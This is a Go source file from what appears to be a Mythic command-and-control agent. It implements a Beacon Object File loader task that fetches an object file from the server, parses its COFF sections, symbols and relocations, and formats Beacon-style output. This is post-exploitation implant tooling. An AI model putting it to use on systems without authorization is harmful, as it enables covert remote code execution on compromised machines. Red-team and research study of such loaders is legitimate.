package main

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"runtime"
	"strconv"
	"strings"
)

// maxCoffBytes caps a fetched BOF object (BOFs are kilobytes; this is
// generous) and maxBeaconOutput caps captured BOF output.
const (
	maxCoffBytes    = 16 << 20
	maxBeaconOutput = 4 << 20
)

// runCoff loads a BOF object and calls entrypoint with the packed argument
// buffer, returning captured Beacon output. The platform implementation
// lives in coff_windows.go; tests override this hook to check the
// orchestration (fetch, validation) without executing code.
var runCoff = runCoffInProcess

func handleExecuteCoff(a *Agent, t Task) (Response, bool) {
	if err := coffHostOK(); err != nil {
		return errResponse(err)
	}
	fileID := taskParam(t.Parameters, "bof_file")
	if fileID == "" {
		return errResponse(fmt.Errorf("no bof file id"))
	}
	entry := taskParam(t.Parameters, "function_name")
	if entry == "" {
		entry = "go"
	}
	timeout := taskTimeout(t.Parameters)
	argsBuf, err := decodeCoffArgs(taskParam(t.Parameters, "coff_arguments"))
	if err != nil {
		return errResponse(err)
	}
	var obj bytes.Buffer
	if _, _, err := fetchMythicFile(t.ID, fileID, a.chunkSize(), a.posterFor(), &obj); err != nil {
		return errResponse(err)
	}
	if obj.Len() == 0 {
		return errResponse(fmt.Errorf("empty bof"))
	}
	if obj.Len() > maxCoffBytes {
		return errResponse(fmt.Errorf("bof too large (%d bytes)", obj.Len()))
	}
	out, err := runCoff(obj.Bytes(), entry, argsBuf, timeout)
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: out, Status: "success",
		Artifacts: oneArtifact("Process Create", "execute_coff "+entry)}, false
}

// coffHostOK rejects BOF execution off x64: the loader maps x64 objects,
// and x86 callback ABIs differ enough to deserve their own loader.
func coffHostOK() error {
	if runtime.GOARCH != "amd64" {
		return fmt.Errorf("execute_coff needs an x64 agent build")
	}
	return nil
}

// taskTimeout reads the BOF thread timeout from a parameters blob,
// defaulting to 30 and clamping to 1..86400.
func taskTimeout(parameters string) int {
	const def, min, max = 30, 1, 86400
	var decoded map[string]any
	if err := json.Unmarshal([]byte(parameters), &decoded); err != nil {
		return def
	}
	var n int
	switch v := decoded["timeout"].(type) {
	case nil:
		return def
	case float64:
		n = int(v)
	case string:
		parsed, err := strconv.Atoi(strings.TrimSpace(v))
		if err != nil {
			return def
		}
		n = parsed
	default:
		return def
	}
	if n < min {
		return min
	}
	if n > max {
		return max
	}
	return n
}

// decodeCoffArgs validates the hex buffer the container packed: a u32LE
// total length matching the remaining bytes. Empty means no arguments.
func decodeCoffArgs(hexArgs string) ([]byte, error) {
	if hexArgs == "" {
		return []byte{0, 0, 0, 0}, nil
	}
	buf, err := hex.DecodeString(hexArgs)
	if err != nil {
		return nil, fmt.Errorf("bad coff_arguments hex: %w", err)
	}
	if len(buf) < 4 {
		return nil, fmt.Errorf("bad coff_arguments: %d bytes", len(buf))
	}
	if total := binary.LittleEndian.Uint32(buf); total != uint32(len(buf)-4) {
		return nil, fmt.Errorf("bad coff_arguments: total %d, have %d", total, len(buf)-4)
	}
	return buf, nil
}

// COFF machine and relocation types the loader accepts (x64 only, v1).
const (
	coffMachineAMD64 = 0x8664
	relAMD64Addr64   = 1
	relAMD64Addr32NB = 3
	relAMD64Rel32    = 4
)

const (
	scnCntCode  = 0x20
	scnCntIData = 0x40
	scnCntUData = 0x80
)

type coffReloc struct {
	offset uint32
	sym    uint32
	typ    uint16
}

type coffSection struct {
	name   string
	data   []byte // file bytes; bss arrives as zeros sized by vsize
	flags  uint32
	relocs []coffReloc
	mapped bool // loaded into the image (skips debug/pdata/directives)
}

type coffSymbol struct {
	name    string
	value   uint32
	section int // 1-based section index, 0 = undefined import
}

type coffImage struct {
	sections []coffSection
	symbols  []coffSymbol
}

// coffSkipSection reports sections the loader never maps: unwind/debug
// metadata, linker directives and import tables BOFs must not carry.
func coffSkipSection(name string) bool {
	switch name {
	case ".pdata", ".xdata", ".drectve", ".llvm_addrsig", ".sxdata",
		".reloc", ".rsrc", ".edata", ".idata", ".tls":
		return true
	}
	return strings.HasPrefix(name, ".debug")
}

// parseCoff reads a COFF relocatable object into sections, symbols and
// relocations. Bounds-checked throughout: a corrupt .o must error, never
// panic or overrun.
func parseCoff(data []byte) (*coffImage, error) {
	fail := func(format string, args ...any) (*coffImage, error) {
		return nil, fmt.Errorf("bad coff: "+format, args...)
	}
	if len(data) < 20 {
		return fail("truncated header (%d bytes)", len(data))
	}
	machine := binary.LittleEndian.Uint16(data[0:])
	if machine != coffMachineAMD64 {
		return fail("machine 0x%04x (x64 only)", machine)
	}
	nsec := int(binary.LittleEndian.Uint16(data[2:]))
	symPtr := binary.LittleEndian.Uint32(data[8:])
	nSym := binary.LittleEndian.Uint32(data[12:])
	optSize := binary.LittleEndian.Uint16(data[16:])
	if optSize != 0 {
		return fail("optional header present (not an object)")
	}
	if nsec <= 0 || nsec > 96 {
		return fail("%d sections", nsec)
	}
	if nSym > 100000 {
		return fail("%d symbols", nSym)
	}
	img := &coffImage{}
	// Section headers follow the 20-byte file header.
	for i := 0; i < nsec; i++ {
		off := 20 + i*40
		if off+40 > len(data) {
			return fail("truncated section header %d", i)
		}
		hdr := data[off : off+40]
		rawName := hdr[:8]
		name := coffSectionName(rawName, data, symPtr, nSym)
		if name == "" {
			return fail("bad section name %d", i)
		}
		rawSize := binary.LittleEndian.Uint32(hdr[16:])
		rawPtr := binary.LittleEndian.Uint32(hdr[20:])
		relPtr := binary.LittleEndian.Uint32(hdr[24:])
		nRel := binary.LittleEndian.Uint16(hdr[32:])
		flags := binary.LittleEndian.Uint32(hdr[36:])
		sec := coffSection{name: name, flags: flags}
		sec.mapped = flags&(scnCntCode|scnCntIData|scnCntUData) != 0 && !coffSkipSection(name)
		if rawSize > 0 {
			if uint64(rawPtr)+uint64(rawSize) > uint64(len(data)) {
				return fail("section %s raw data out of range", name)
			}
			sec.data = data[rawPtr : rawPtr+rawSize]
		} else if flags&scnCntUData != 0 {
			// .bss carries no raw bytes; size comes from vsize.
			vsize := binary.LittleEndian.Uint32(hdr[8:])
			if vsize > maxCoffBytes {
				return fail("section %s bss too large", name)
			}
			sec.data = make([]byte, vsize)
		}
		for r := 0; r < int(nRel); r++ {
			roff := int(relPtr) + r*10
			if roff+10 > len(data) {
				return fail("section %s truncated relocations", name)
			}
			sec.relocs = append(sec.relocs, coffReloc{
				offset: binary.LittleEndian.Uint32(data[roff:]),
				sym:    binary.LittleEndian.Uint32(data[roff+4:]),
				typ:    binary.LittleEndian.Uint16(data[roff+8:]),
			})
		}
		img.sections = append(img.sections, sec)
	}
	// Symbol table: 18-byte records. Aux records stay as empty
	// placeholders so slice indices match relocation references.
	for i := uint32(0); i < nSym; {
		off := int(symPtr) + int(i)*18
		if off+18 > len(data) {
			return fail("truncated symbol %d", i)
		}
		rec := data[off : off+18]
		name := coffSymbolName(rec[:8], data, symPtr, nSym)
		if name == "" {
			return fail("bad symbol name %d", i)
		}
		aux := rec[17]
		section := int(int16(binary.LittleEndian.Uint16(rec[12:])))
		img.symbols = append(img.symbols, coffSymbol{
			name:    name,
			value:   binary.LittleEndian.Uint32(rec[8:]),
			section: section,
		})
		for a := uint8(0); a < aux; a++ {
			img.symbols = append(img.symbols, coffSymbol{})
		}
		i += 1 + uint32(aux)
	}
	return img, nil
}

// coffTableString reads offset off (counted from the table base, whose
// first 4 bytes are the size) from the string table past the symbols.
func coffTableString(data []byte, symPtr, nSym, off uint32) string {
	strTab := int(symPtr) + int(nSym)*18
	if strTab+4 > len(data) {
		return ""
	}
	tabSize := int(binary.LittleEndian.Uint32(data[strTab:]))
	if strTab+tabSize > len(data) {
		return ""
	}
	// Offsets count from the table base, so 4 is the first string.
	start := strTab + int(off)
	if off < 4 || start >= strTab+tabSize {
		return ""
	}
	end := bytes.IndexByte(data[start:strTab+tabSize], 0)
	if end < 0 {
		return ""
	}
	return string(data[start : start+end])
}

// coffSectionName resolves a section-header name: inline, or "/decimal"
// ASCII into the string table.
func coffSectionName(raw, data []byte, symPtr, nSym uint32) string {
	if len(raw) < 8 {
		return ""
	}
	if raw[0] == '/' {
		var off uint32
		for _, c := range raw[1:8] {
			if c == 0 {
				break
			}
			if c < '0' || c > '9' {
				return ""
			}
			off = off*10 + uint32(c-'0')
		}
		return coffTableString(data, symPtr, nSym, off)
	}
	if i := bytes.IndexByte(raw[:8], 0); i >= 0 {
		return string(raw[:i])
	}
	return string(raw[:8])
}

// coffSymbolName resolves a symbol-record name: inline, or a binary u32
// offset into the string table when the first four bytes are zero.
func coffSymbolName(raw, data []byte, symPtr, nSym uint32) string {
	if len(raw) < 8 {
		return ""
	}
	if raw[0] != 0 || raw[1] != 0 || raw[2] != 0 || raw[3] != 0 {
		if i := bytes.IndexByte(raw[:8], 0); i >= 0 {
			return string(raw[:i])
		}
		return string(raw[:8])
	}
	return coffTableString(data, symPtr, nSym, binary.LittleEndian.Uint32(raw[4:]))
}

// beaconReader reads NUL-terminated strings from BOF memory.
type beaconReader struct {
	bytes func(p uintptr) string // char*
	wide  func(p uintptr) string // wchar_t*
}

// formatBeacon renders a BeaconPrintf-style format string. slots holds the
// data arguments in order (register slots first, then stack slots); each
// conversion consumes one. Width, precision and flags are honored by
// delegating each conversion to fmt; unknown conversions stay literal
// without consuming a slot. Output is capped.
func formatBeacon(format string, slots []uintptr, mem beaconReader) string {
	var b strings.Builder
	slot := 0
	take := func() (uintptr, bool) {
		if slot >= len(slots) {
			return 0, false
		}
		v := slots[slot]
		slot++
		return v, true
	}
	isDigit := func(c byte) bool { return c >= '0' && c <= '9' }
	for i := 0; i < len(format); {
		c := format[i]
		if c != '%' || i+1 >= len(format) {
			b.WriteByte(c)
			i++
			continue
		}
		if format[i+1] == '%' {
			b.WriteByte('%')
			i += 2
			continue
		}
		start := i
		j := i + 1
		// Flags, width, precision. Stars consume int slots whose
		// values are spliced into the delegated spec.
		flagStart := j
		for j < len(format) && strings.IndexByte("-+ #0", format[j]) >= 0 {
			j++
		}
		spec := format[flagStart:j]
		if j < len(format) && format[j] == '*' {
			w, _ := take()
			spec += strconv.FormatUint(uint64(w), 10)
			j++
		} else {
			numStart := j
			for j < len(format) && isDigit(format[j]) {
				j++
			}
			spec += format[numStart:j]
		}
		if j < len(format) && format[j] == '.' {
			j++
			if j < len(format) && format[j] == '*' {
				p, _ := take()
				spec += "." + strconv.FormatUint(uint64(p), 10)
				j++
			} else {
				numStart := j
				for j < len(format) && isDigit(format[j]) {
					j++
				}
				spec += "." + format[numStart:j]
			}
		}
		// Length modifiers (consumed but not delegated: Go verbs take
		// no lengths; masking below applies the narrowing instead).
		long := 0
		short := 0
		for j < len(format) {
			switch format[j] {
			case 'l':
				long++
				j++
			case 'h':
				short++
				j++
			case 'j', 'z', 't', 'L':
				j++
			default:
				goto conv
			}
		}
	conv:
		if j >= len(format) {
			b.WriteString(format[i:])
			break
		}
		verb := format[j]
		i = j + 1
		unsigned, hex, hexUp, ptr, chr, str, wide, oct := false, false, false, false, false, false, false, false
		switch verb {
		case 'd', 'i':
		case 'u':
			unsigned = true
		case 'x':
			unsigned, hex = true, true
		case 'X':
			unsigned, hexUp = true, true
		case 'o':
			unsigned, oct = true, true
		case 'p':
			ptr = true
		case 'c':
			chr = true
		case 's':
			if long > 0 {
				wide = true
			} else {
				str = true
			}
		case 'S':
			wide = true
		case 'C':
			chr = true
		default:
			// Unknown (floats, n, ...) stays literal, consumes nothing.
			b.WriteString(format[start:i])
			continue
		}
		v, ok := take()
		if !ok {
			b.WriteString("(missing)")
			continue
		}
		if short >= 2 {
			v &= 0xFF
		} else if short == 1 {
			v &= 0xFFFF
		}
		switch {
		case str:
			fmt.Fprintf(&b, "%"+spec+"s", mem.bytes(v))
		case wide:
			fmt.Fprintf(&b, "%"+spec+"s", mem.wide(v))
		case chr:
			fmt.Fprintf(&b, "%"+spec+"c", rune(v))
		case ptr:
			fmt.Fprintf(&b, "%#x", v)
		case hex:
			fmt.Fprintf(&b, "%"+spec+"x", v)
		case hexUp:
			fmt.Fprintf(&b, "%"+spec+"X", v)
		case oct:
			fmt.Fprintf(&b, "%"+spec+"o", v)
		case unsigned:
			fmt.Fprintf(&b, "%"+spec+"d", v)
		default:
			fmt.Fprintf(&b, "%"+spec+"d", int64(v))
		}
		if b.Len() > maxBeaconOutput {
			out := b.String()
			return out[:maxBeaconOutput] + "...[truncated]"
		}
	}
	return b.String()
}
